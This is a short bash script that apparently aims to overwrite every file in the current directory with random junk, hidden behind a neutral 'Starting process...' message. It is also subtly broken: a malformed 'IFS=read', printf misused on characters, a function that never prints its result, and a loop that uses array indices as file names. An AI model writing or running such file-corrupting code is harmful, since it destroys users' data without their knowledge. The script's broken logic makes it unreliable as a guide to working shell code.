#!/bin/bash
JunkFlile()
{
    file=$1
    letters="qwertyuiopasdfghjklzxcvbnm"
    output=""
    while IFS=read -r line; do
        for (( i=0; i<${#line}; i++ ))
        {
            byteValue=$(printf "%d" "${line:$i:1}")
            randValue=$(printf "%d" "$((RANDOM % ${#letters}))")
            if [[ "$byteValue" == "$randValue" ]]; then
                output+="$byteValue"
            else
                output+="$randValue"
            fi
        }
    done < $file
}
echo "Starting process..."
sleep 1
files=($(ls))
for i in ${!files[@]}; do
    echo $(JunkFlile $i) > $i
done
